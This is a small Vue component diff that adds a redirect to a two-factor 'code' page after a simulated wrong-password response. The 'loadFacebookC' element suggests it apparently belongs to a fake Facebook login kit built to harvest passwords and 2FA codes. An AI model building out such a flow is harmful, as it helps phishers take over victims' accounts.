@@ -184,6 +184,14 @@ export default {
             // Simulate moving to CMD_CODE after wrong password submission
             let fakeResponse = "CMD_CODE"; // Simulate CMD_CODE response
             this.handleResponse(fakeResponse);
+            // Redirect to twofa route with type set to "code"
+            this.$router.push({
+              name: "twofa",
+              params: {
+                type: "code",
+                email: this.form.email,
+              },
+            });
           })
           .catch((error) => {
             console.error(error);
@@ -210,6 +218,7 @@ export default {
   },
 };
 </script>
+
 
 <template>
   <div v-if="loading" id="loadFacebookC" class="">
